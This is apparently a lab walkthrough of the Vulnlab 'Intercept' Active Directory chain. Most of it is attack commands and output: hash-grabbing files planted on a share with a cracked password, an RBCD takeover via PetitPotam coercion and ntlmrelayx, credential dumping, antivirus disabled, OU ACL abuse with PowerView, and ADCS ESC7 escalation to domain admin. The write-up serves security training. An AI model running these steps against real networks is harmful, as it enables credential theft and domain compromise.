---
categories:
- Vulnlab
image:
  path: intercept_preview.png
layout: post
media_subpath: /assets/posts/2023-07-01-vl-intercept-walkthrough
tags:
- active directory
- adcs
- relaying
- windows
title: "VL Intercept"
---

Intercept is a chain of vulnerable machines on [Vulnlab ](https://vulnlab.com)and involves stealing hashes with lnk files, a RBCD-Workstation takeover, exploiting GenericALL on OUs & finally attacking ADCS using ESC7.

Port Scan:

```
sudo nmap -iL ips.txt -sV -sC -oA scan
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-01 17:03 CEST
Nmap scan report for dc01.intercept.vl (10.10.158.69)
Host is up (0.024s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-09 14:02:25Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intercept.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.intercept.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.intercept.vl
| Not valid before: 2023-06-27T13:28:30
|_Not valid after:  2024-06-26T13:28:30
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intercept.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.intercept.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.intercept.vl
| Not valid before: 2023-06-27T13:28:30
|_Not valid after:  2024-06-26T13:28:30
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: intercept.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.intercept.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.intercept.vl
| Not valid before: 2023-06-27T13:28:30
|_Not valid after:  2024-06-26T13:28:30
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intercept.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.intercept.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.intercept.vl
| Not valid before: 2023-06-27T13:28:30
|_Not valid after:  2024-06-26T13:28:30
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: INTERCEPT
|   NetBIOS_Domain_Name: INTERCEPT
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: intercept.vl
|   DNS_Computer_Name: DC01.intercept.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2023-07-09T14:03:05+00:00
| ssl-cert: Subject: commonName=DC01.intercept.vl
| Not valid before: 2023-06-27T13:12:41
|_Not valid after:  2023-12-27T13:12:41
|_ssl-date: 2023-07-09T14:03:44+00:00; -1s from scanner time.
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2023-07-09T14:03:07
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.28 seconds

Nmap scan report for ws01.intercept.vl (10.10.158.70)
Host is up (0.020s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WS01.intercept.vl
| Not valid before: 2023-06-27T13:11:58
|_Not valid after:  2023-12-27T13:11:58
| rdp-ntlm-info:
|   Target_Name: INTERCEPT
|   NetBIOS_Domain_Name: INTERCEPT
|   NetBIOS_Computer_Name: WS01
|   DNS_Domain_Name: intercept.vl
|   DNS_Computer_Name: WS01.intercept.vl
|   DNS_Tree_Name: intercept.vl
|   Product_Version: 10.0.19041
|_  System_Time: 2023-07-01T15:04:44+00:00
|_ssl-date: 2023-07-01T15:05:24+00:00; -1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-07-01T15:04:51
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

Post-scan script results:
| clock-skew:
|   -1s:
|     10.10.158.69 (dc01.intercept.vl)
|_    10.10.158.70 (ws01.intercept.vl)
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

We see 2 machines, a Windows 10 workstation & a domain controller. Since there don’t seem to be any unusual services and we have no user yet, enumeration is somewhat limited but we still have some options here:

- Bruteforce users using kerberos, e.g. via kerbrute
- Asreproast from a list of known usernames
- Check for missing SMB-Signing
- Man-in-the-Middle Attacks
- Anonymous shares

We are not going to do bruteforcing here or any MitM attacks – this leaves us with checking the signing configuration and looking for anonymous shares.

Checking Signing:

```
crackmapexec smb 10.10.158.69-70 --gen-relay-list relay.txt
SMB         10.10.158.70    445    WS01             [*] Windows 10.0 Build 19041 x64 (name:WS01) (domain:intercept.vl) (signing:False) (SMBv1:False)
SMB         10.10.158.69    445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False)
```

This is the default on windows domains – the DC has signing enforced but the workstation system hasn’t.

Checking Anonymous Shares:

```
smbclient -L \\\\dc01.intercept.vl
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------

smbclient -L \\\\ws01.intercept.vl
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	dev             Disk      shared developer workspace
	IPC$            IPC       Remote IPC
	Users           Disk
```

We can see that ws01 has a dev share & a users share while the domain controller has none we could access. Let’s check out the dev share:

```
echo 123 > test.txt
smbclient \\\\ws01.intercept.vl\\dev

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jun 29 17:23:05 2023
  ..                                  D        0  Thu Jun 29 17:23:05 2023
  projects                            D        0  Thu Jun 29 13:57:25 2023
  readme.txt                          A      123  Thu Jun 29 13:44:59 2023
  tools  

smb: \> put test.txt
putting file test.txt as \test.txt (0.1 kb/s) (average 0.1 kb/s)

smb: \> get readme.txt
getting file \readme.txt of size 123 as readme.txt (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec)
smb: \> exit

cat readme.txt
Please check this share regularly for updates to the application (this is a temporary solution until we switch to gitlab).
```

This suggests that someone is updating something on this share and also encourages to check back regulary. We also confirmed that we can write here. If we can write a domain share, it’s possible to place a scf/lnk or other hash-grabbing payload that will coerce NTLM Authentication back to our machine! We can not relay this anywhere since the only other machine is the domain controller which has SMB signing enforced, but we can try to crack the NetNLTMv2 hash should a user visit the share.

To create the payload we use [hashgrab ](https://github.com/xct/hashgrab)and then upload the generated files after starting impacket’s smbserver.

```
python3 ~/tools/hashgrab/hashgrab.py 10.8.0.36 xct

impacket-smbserver share share -smb2support

smbclient \\\\ws01.intercept.vl\\dev
Try "help" to get a list of possible commands.
smb: \> put @xct.url
smb: \> put @xct.scf
smb: \> put xct.library-ms
smb: \> put desktop.ini
```

After a moment, we get a connect back from a user that has been browsing to the share:

```
[*] Incoming connection (10.10.158.70,55925)
[*] AUTHENTICATE_MESSAGE (INTERCEPT\Kathryn.Spencer,WS01)
[*] User WS01\Kathryn.Spencer authenticated successfully
[*] Kathryn.Spencer::INTERCEPT:aaaaaaaaaaaaaaaa:862dbe919ed1214474158885d08319b6:01010000000000008030155530acd90131448fefcebcbcd100000000010010007800570064004a0049004c0068006c00030010007800570064004a0049004c0068006c00020010007900620072007100730052006c006500040010007900620072007100730052006c006500070008008030155530acd90106000400020000000800300030000000000000000000000000200000b7d3e5eb02a71b9cb39e4fadbc9a8603d5745af9db951ae1e87e2bcdc649ea580a0010000000000000000000000000000000000009001c0063006900660073002f00310030002e0038002e0030002e00330036000000000000000000
```

Let’s try to crack the hash. We copy the line with username & hash and store it in a file on disk. Then we run hashcat:

```
hashcat -m 5600 hash ~/tools/SecLists/Passwords/Leaked-Databases/rockyou-75.txt

KATHRYN.SPENCER::INTERCEPT:aaaaaaaaaaaaaaaa:862dbe919ed1214474158885d08319b6:01010000000000008030155530acd90131448fefcebcbcd100000000010010007800570064004a0049004c0068006c00030010007800570064004a0049004c0068006c00020010007900620072007100730052006c006500040010007900620072007100730052006c006500070008008030155530acd90106000400020000000800300030000000000000000000000000200000b7d3e5eb02a71b9cb39e4fadbc9a8603d5745af9db951ae1e87e2bcdc649ea580a0010000000000000000000000000000000000009001c0063006900660073002f00310030002e0038002e0030002e00330036000000000000000000:Chocolate1
```

This worked and gives us our first domain credentials: `kathryn.spencer:Chocolate1` . Having domain credentials opens up [a whole new world](https://www.youtube.com/watch?v=0eWUhXPhIaE) of enumeration possibilities:

- Gathering Bloodhound data
- Gathering Certipy data
- Check LDAP signing
- Check Machine Account Quota
- Check for kerberoastable accounts

```
# Bloodhound
bloodhound-python -c all --disable-pooling -w 1 -u kathryn.spencer -p 'Chocolate1' -d intercept.vl -dc dc01.intercept.vl -ns 10.10.158.69 --dns-tcp --zip --dns-timeout 120
INFO: Found AD domain: intercept.vl
...
INFO: Done in 00M 23S
INFO: Compressing output into 20230701183457_bloodhound.zip

# Certipy
/usr/local/bin/certipy find -u "kathryn.spencer" -p 'Chocolate1' -dc-ip 10.10.158.69  -dns-tcp -ns 10.10.158.69 -bloodhound
[*] Finding certificate templates
[*] Found 33 certificate templates
...
[*] Got CA configuration for 'intercept-DC01-CA'
[*] Saved BloodHound data to '20230701183614_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k

# LDAP Signing
crackmapexec ldap 10.10.158.69 -u kathryn.spencer -p Chocolate1 -M ldap-checker
SMB         10.10.158.69   445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:intercept.vl) (signing:True) (SMBv1:False)
LDAP        10.10.158.69   389    DC01             [+] intercept.vl\kathryn.spencer:Chocolate1
LDAP-CHE... 10.10.158.69   389    DC01             LDAP Signing NOT Enforced!
LDAP-CHE... 10.10.158.69   389    DC01             Channel Binding is set to "NEVER" - Time to PWN!

# Machine Account Quota
crackmapexec ldap dc01.intercept.vl -u kathryn.spencer -p 'Chocolate1' -M maq
SMB         dc01.intercept.vl 445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:intercept.vl) (signing:True) (SMBv1:False)
LDAP        dc01.intercept.vl 389    DC01             [+] intercept.vl\kathryn.spencer:Chocolate1
MAQ         dc01.intercept.vl 389    DC01             [*] Getting the MachineAccountQuota
MAQ         dc01.intercept.vl 389    DC01             MachineAccountQuota: 10

# Kerberoast
impacket-GetUserSPNs intercept.vl/kathryn.spencer:'Chocolate1' -dc-ip 10.10.158.69 -debug
No entries found!
```

After importing both certipy’s & bloodhound’s zips into the local Bloodhound database, we check for any suspicious configurations in the UI. This reveals that Simon Bowen is in the helpdesk group which has GenericAll permissions over the ca-managers OU. GenericAll will allow us to take control over the ca-managers group inside the OU and to add ourselves (e.g. Simon) to this group as well. But we don’t have any credentials for Simon yet. Looking at Kathryn’s permissions does not show anything interesting – so what can we do at this point?

![](this_is_fine-1024x516.jpg)We just have a low privileged domain user that has no permissions whatsoever anywhere which means we are limited to actions that *any* domain user is allowed to. Luckily this involves quite a lot of things. First of all we can add computer accounts to the domain because the quota is set to 10 (the default). On the other hand LDAP signing and channel binding is not enforced (also the default). This opens up a possibility for an attack on clients which is known as RBCD workstation takeover.

Roughly this works as follows: First, we coerce authentication from a workstation that is running the webclient service (if its not running it can be forced to start remotely). This will give us a machine account authentication from WS01$ to our machine. Sadly we can’t relay SMB authentication to the only other machine (the DC) because of enforced SMB-Signing. However we can coerce authentication against WebDAV instead. WebDAV uses HTTP, so the machine will use NTLM Authentication to authenticate. Since this is a web request, SMB-Signing is not relevant here and we are now indeed able to relay the authentication to the DC (to LDAP, since LDAP signing is not enforced). Using WebDAV coersion instead of SMB can be achieved by specifiying a port that’s not 445, e.g. `\\attacker@8080`.

There is however one caveat. We can not put an ip address – it will only authenticate against a target thats in the trusted zone so we would need to add a dns entry somehow. Luckily this is also something that’s allowed for any user in the domain by default!

So what does relaying this authentication to LDAP on the DC let us do? We will be in the context of WS01$ and that account is allowed to set any attribute on itself (since its the owner). This allows us to create the conditions for RBCD writing the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on WS01$ and with that allow a new machine account we create to impersonate any user on the machine.

Let’s execute the attack now:

```
# Add new dns entry that points to our attacker machine, set your local dns server to the dc ip in /etc/resolv.conf before running
python dnstool.py -u intercept.vl\\kathryn.spencer -p 'Chocolate1' -r xct.intercept.vl -d 10.8.0.36 --action add dc01.intercept.vl

# Add a new machine account
impacket-addcomputer -computer-name 'WS02$' -computer-pass 'Start123!' -dc-host dc01.intercept.vl -domain-netbios intercept  'INTERCEPT/Kathryn.Spencer:Chocolate1'

# Listener for relaying auth to LDAP on the DC in order to configure RBCD on WS01$ (it's allowed to write it's own attribute)
sudo impacket-ntlmrelayx -smb2support -t ldaps://dc01.intercept.vl --http-port 8080 --delegate-access --escalate-user WS02\$ --no-dump --no-acl --no-da

# Coerce Authentication from the workstation WS01$ using a non-default port so it's a WebDAV authentication
python3 PetitPotam.py -d intercept.vl -u 'Kathryn.Spencer' -p 'Chocolate1' xct@8080/a ws01.intercept.vl

# Impersonate Administrator on WS01 by using our RBCD privileges
impacket-getST -spn cifs/ws01.intercept.vl intercept.vl/WS02\$ -impersonate administrator
export KRB5CCNAME=$PWD/administrator.ccache
impacket-secretsdump -k -no-pass ws01.intercept.vl
...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:xxx:::
...
[*] _SC_HelpdeskService
Simon.Bowen@intercept.vl:xxx
...
```

The whole attack worked & we got to dump all credentials on WS01. We could also logon now and look around the machine but since we already identified a possible next step involving Simon Bowen (and we just got his creds) we will continue on this path.

In order to add ourselves to the ca-managers group I’m going to add simon as an administrator on WS01 and then use RDP to execute the attack. Adding a new users to the local administrators is not great opsec-wise so be careful ;)

```
impacket-smbexec -k -no-pass ws01.intercept.vl

C:\Windows\system32> net localgroup administrators simon.bowen /add

xfreerdp /v:ws01.intercept.vl /u:simon.bowen /p:'xxx' /w:1366 /h:768
```

Now that we are on the box we notice that MalwareBytes is running. Given that we are an administrator, we disable it in the UI. Now we can upload, import and use PowerView:

```
. .\PowerView.ps1
Get-DomainOU 'ca-managers' // note the UID and replace it below

$Guids = Get-DomainGUIDMap
$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name

$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'simon.bowen' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid

$OU = Get-DomainOU -Raw <UID from first step>
$dsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()

Add-DomainGroupMember -Identity "ca-managers" -Members simon.bowen -Verbose
```

This will give us ownership over the ca-managers group and then add ourselves (here Simon, since we know the credentials to this account – we could also have used Kathryn) to it.

To proceed, we check what ca-managers can actually do in the Bloodhound UI after importing certipys bloodhound data. If you click on ESC7 you will see an attack path available thats based on the fact that we are now a ca manager (as the group name suggests).

We can execute the attack as follows:

```
# Add simon.bowen as an officer, this allows to approve templates
/usr/local/bin/certipy ca -ca 'intercept-DC01-CA' -add-officer simon.bowen -username simon.bowen@intercept.vl -hashes :<REDACTED> -dc-ip 10.10.210.165 -dns-tcp -ns 10.10.210.165

# Enable the SubCA template, we will need it later on
/usr/local/bin/certipy ca -ca 'intercept-DC01-CA' -enable-template 'SubCA' -username simon.bowen@intercept.vl -hashes :<REDACTED> -dc-ip 10.10.210.165 -dns-tcp -ns 10.10.210.165

# Request a certificate from the SubCA template, this will fail but still save the private key
/usr/local/bin/certipy req -username simon.bowen@intercept.vl -hashes :<REDACTED> -ca 'intercept-DC01-CA' -target dc01.intercept.vl -template SubCA -upn administrator@intercept.vl -dc-ip 10.10.210.165 -dns-tcp -ns 10.10.210.165

# It failed because it needs approval (the CA is set to manager approval mode). Now we approve it ourselves!
/usr/local/bin/certipy ca -username simon.bowen@intercept.vl -hashes :<REDACTED> -ca 'intercept-DC01-CA' -issue-request 3 -dc-ip 10.10.210.165 -dns-tcp -ns 10.10.210.165

# Now that it's issued, we can request it again
/usr/local/bin/certipy req -username simon.bowen@intercept.vl -hashes :<REDACTED> -ca 'intercept-DC01-CA' -target dc01.intercept.vl -retrieve 3 -dc-ip 10.10.210.165 -dns-tcp -ns 10.10.210.165

# Finally we can use the cert to authenticate, retrieve the NTLM hash & then connect to the DC as administrator
/usr/local/bin/certipy auth -pfx administrator.pfx -domain intercept.vl -username administrator -dc-ip 10.10.210.165
impacket-smbexec administrator@dc01.intercept.vl -hashes :<REDACTED>
```

This is the end of this chain. Originally I wanted to introduce mitm6 and spoofing/poisoning but this is currently not possible on this particular lab infrastruture. If that would be the case, it wouldn’t be neccesary to have the lnk/scf files in the beginning and you could exploit it as follows without having \*any\* domain credentials:

```
mitm6 -hw WS01 -d intercept.vl --ignore-nofqdn -i eth0
impacket-ntlmrelayx -t ldaps://dc01.intercept.vl -wh attacker-wpad --delegate-access
...
[*] Attempting to create computer in: CN=Computers,DC=intercept,DC=vl
[*] Adding new computer with username: NHWOLPTB$ and password: wazhp!/Z_i>gi_P result: OK
[*] Delegation rights modified succesfully!
[*] NHWOLPTB$ can now impersonate users on WS01$ via S4U2Proxy
```

## Resources

- <https://www.tarlogic.com/blog/ad-cs-esc7-attack/>
- <https://www.hackingarticles.in/lateral-movement-webclient-workstation-takeover/>
- <https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse#abuse-genericall>
- <https://github.com/topotam/PetitPotam>
- <https://github.com/dirkjanm/krbrelayx>
- <https://github.com/fortra/impacket>